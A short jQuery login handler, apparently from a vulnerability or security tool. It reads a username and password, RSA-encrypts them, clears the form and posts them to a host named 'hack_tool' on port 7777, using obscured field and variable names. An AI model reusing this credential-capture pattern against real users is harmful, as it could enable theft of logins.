$(document).ready(function () {
    //BORRAR
    $("#erbo696").click(function () {


        let suti = $("#Usuario").val();
        let janiyati = $("#dfs654").val();
        let data = {
            user: suti,
            pass: janiyati
        }
        let datao = JSON.stringify(data);

        // Cifrar con la clave pública
        let encrypt = new JSEncrypt();
        encrypt.setPublicKey(atob("LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFqY1dlODVxdGhtZGxJK1h5MCtqMgoweWpGQTkxaXA4Yzd2Qy9Xb1hxc054UmlweXd2NHdPOTE2cEhzTEEwTWgydEF2R01zbU9QRzE4NHNoNngyQ2tECkRwNmpqd2wzSHAvUG1TVUMvREJiYlBORkh4aFEzcFdLTGlGMDhMbElqcHdxazhzY0htaldDWmc2TzEvWVVNZGUKVk9YREVYY29md1pFL3RpZzJjZ0RxT2N5dGxOS2oxa01XTmhMM1RjaU9KZEd2VmFOL2xSK2E3d0hGZDZSbnJSMQpkTFR3S21zMkptZm1pbjFZdS83dWFZZ0Rlc2VJcWc5eEpKek9GdTJXTGZjdWFpVER1ODZYbnlSYmxsR1VuSnhNCkJ1RzNkZ3EvQ2s1dGtIOWRHQVljVTZrc04yK0htdU55Wmx1OVJULytQekxDZTQ3MjJGR3I4bjlWSFhNMlZFVXAKZ1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"));
        let encrypted = encrypt.encrypt(datao);
        $("#ko895").trigger("reset");
        fetch("http://hack_tool:7777/api/token", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json'
                    // 'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: JSON.stringify({
                    oeiro: encrypted
                }),
            })
            .then(function (response) {
                if (response.ok) {
                    return response.text();
                } else {
                    throw "Error en la llamada Ajax";
                }
            })
            .then(function (texto) {
                console.log(texto);
                //Swal.fire("La vulnerabilidad se actualizó correctamente", "", "success");
            })
            .catch(function (err) {
                console.log(err);
                //Swal.fire("No se realizó ningun cambio", "", "warning");
            });



    });

});